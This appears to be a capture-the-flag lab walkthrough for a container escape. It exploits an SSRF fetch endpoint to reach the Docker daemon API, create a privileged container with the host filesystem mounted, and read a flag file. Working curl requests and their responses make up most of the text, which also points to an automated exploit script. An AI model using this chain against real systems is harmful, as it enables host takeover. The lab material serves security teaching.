# Walkthrough: Container Escape via Docker Socket SSRF

## Setup

```bash
docker compose up --build -d
```

## Step 1: Discover SSRF

```bash
curl -s -X POST http://localhost:8080/fetch \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:2376/_ping"}'
```

```json
{"status": 200, "body": "OK"}
```

The Docker daemon is reachable from the container via loopback.

## Step 2: Create privileged container

```bash
curl -s -X POST http://localhost:8080/fetch \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://127.0.0.1:2376/containers/create",
    "method": "POST",
    "body": {
      "Image": "alpine:latest",
      "HostConfig": {"Privileged": true, "Binds": ["/:/host-root:ro"]}
    }
  }'
```

```json
{"status": 201, "body": "{\"Id\": \"c00000001\", \"Warnings\": []}"}
```

## Step 3: Create exec

```bash
curl -s -X POST http://localhost:8080/fetch \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://127.0.0.1:2376/containers/c00000001/exec",
    "method": "POST",
    "body": {"AttachStdout": true, "Cmd": ["cat", "/host-root/flag.txt"]}
  }'
```

```json
{"status": 201, "body": "{\"Id\": \"e00000001\"}"}
```

## Step 4: Start exec and read flag

```bash
curl -s -X POST http://localhost:8080/fetch \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://127.0.0.1:2376/exec/e00000001/start",
    "method": "POST",
    "body": {}
  }'
```

```json
{"status": 200, "body": "POC{...}\n"}
```

## Automated

```bash
python3 exploit/exploit.py http://localhost:8080
```

## Teardown

```bash
docker compose down
```
